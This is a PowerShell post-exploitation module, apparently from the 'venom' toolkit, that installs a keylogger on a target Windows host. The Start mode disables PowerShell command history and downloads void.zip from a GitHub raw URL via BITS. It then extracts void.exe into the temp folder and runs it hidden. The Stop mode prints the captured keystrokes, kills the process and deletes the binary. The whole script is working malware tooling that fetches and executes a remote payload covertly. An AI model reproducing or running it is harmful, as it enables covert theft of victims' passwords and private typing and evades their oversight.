<#
.SYNOPSIS
   Capture remote host keystrokes {void}

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   This module start recording target system keystrokes
   in background mode and only stops if void.exe binary
   its deleted or is process {void.exe} its stoped.

.Parameter Keylogger
   Accepts arguments: Start and Stop

.EXAMPLE
   PS C:\> .\Keylogger.ps1 -Keylogger Start
   Download/Execute void.exe in child process
   to be abble to capture system keystrokes

.EXAMPLE
   PS C:\> .\Keylogger.ps1 -Keylogger Stop
   Stop keylogger by is process FileName identifier
   and delete keylogger and all respective files/logs

.OUTPUTS
   StartTime ProcessName PID  LogFile                                   
   --------- ----------- ---  -------                                   
   17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Keylogger="false"
)


Write-Host ""
$Remote_hostName = hostname
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($Keylogger -ieq 'Start' -or $Keylogger -ieq 'Stop'){
$Timer = Get-Date -Format 'HH:mm:ss'

   If($Keylogger -ieq 'Start'){## Download binary from venom\GitHub (RAW)
      write-host "[+] Capture $Remote_hostName\$Env:USERNAME keystrokes." -ForeGroundColor Green;Start-Sleep -Seconds 1
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/void.zip -Destination $Env:TMP\void.zip -ErrorAction SilentlyContinue|Out-Null   

      ## Check for Failed/Corrupted downloads
      $SizeDump = ((Get-Item "$Env:TMP\void.zip" -EA SilentlyContinue).length/1KB)
      If(-not(Test-Path -Path "$Env:TMP\void.zip") -or $SizeDump -lt 36){## Fail to download void using BitsTransfer
         Write-Host "[fail] to download void.zip using BitsTransfer (BITS)" -ForeGroundColor Red -BackgroundColor Black
      }Else{

         ## De-Compress Keylogger Archive files into $env:TMP remote directory
         Expand-Archive -Path "$Env:TMP\void.zip" -DestinationPath "$Env:TMP\void" -Force -ErrorAction SilentlyContinue|Out-Null
         Move-Item $Env:TMP\void\void.exe $Env:TMP\void.exe -Force -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void" -Force -Recurse -EA SilentlyContinue
         Remove-Item -Path "$Env:TMP\void.zip" -Force

         ## Start void.exe in an orphan process
         $KeyLoggerTimer = Get-Date -Format 'HH:mm:ss'
         Start-Process -WindowStyle hidden -FilePath "$Env:TMP\void.exe" -ErrorAction SilentlyContinue|Out-Null
         Start-Sleep -Milliseconds 2600;$PIDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

         ## Create Data Table for output
         $mytable = New-Object System.Data.DataTable
         $mytable.Columns.Add("StartTime")|Out-Null
         $mytable.Columns.Add("ProcessName")|Out-Null
         $mytable.Columns.Add("PID")|Out-Null
         $mytable.Columns.Add("LogFile")|Out-Null
         $mytable.Rows.Add("$KeyLoggerTimer",
                           "void.exe",
                           "$PIDS",
                           "$Env:TMP\void.log")|Out-Null

         ## Display Data Table
         $mytable|Format-Table -AutoSize > $Env:TMP\KeyDump.log
         Get-Content -Path "$Env:TMP\KeyDump.log"
         Remove-Item -Path "$Env:TMP\KeyDump.log" -Force
      }
   }

   If($Keylogger -ieq 'Stop'){
      ## Dump captured keystrokes
      # Stops process and Delete files/logs
      Write-Host "Captured keystrokes" -ForegroundColor Green
      Write-Host "-------------------"
      If(Test-Path -Path "$Env:TMP\void.log"){## Read keylogger logfile
         $parsedata = Get-Content -Path "$Env:TMP\void.log"
         $Diplaydata = $parsedata  -replace "\[ENTER\]","`r`n" -replace "</time>","</time>`r`n" -replace "\[RIGHT\]",""  -replace "\[CTRL\]","" -replace "\[BACKSPACE\]","" -replace "\[DOWN\]","" -replace "\[LEFT\]","" -replace "\[UP\]","" -replace "\[WIN KEY\]r","" -replace "\[CTRL\]v","" -replace "\[CTRL\]c","" -replace "ALT DIREITO2","@" -replace "ALT DIREITO",""
         Write-Host "$Diplaydata"
      };Write-Host ""
      write-host "[+] Stoping keylogger process (void.exe)" -ForeGroundColor Green;Start-Sleep -Seconds 1
      $IDS = Get-Process void -ErrorAction SilentlyContinue|Select-Object -ExpandProperty Id|Select -Last 1

      If($IDS){## keylogger process found
         taskkill /F /IM void.exe|Out-Null
         If($? -ieq 'True'){## Check Last Command ErrorCode (LASTEXITCODE)
            write-host "[i] Keylogger PID $IDS process successfuly stoped!" -ForegroundColor Yellow
         }Else{
            write-host "[fail] to terminate keylogger PID process!" -ForeGroundColor Red -BackgroundColor Black
         }
      }Else{
         write-host "[fail] keylogger process PID not found!" -ForeGroundColor Red -BackgroundColor Black
      }

      ## Clean old keylogger files\logs
      #Remove-Item -Path "$Env:TMP\void.log" -EA SilentlyContinue -Force
      Remove-Item -Path "$Env:TMP\void.exe" -EA SilentlyContinue -Force
      write-host "";Start-Sleep -Seconds 1
   }
}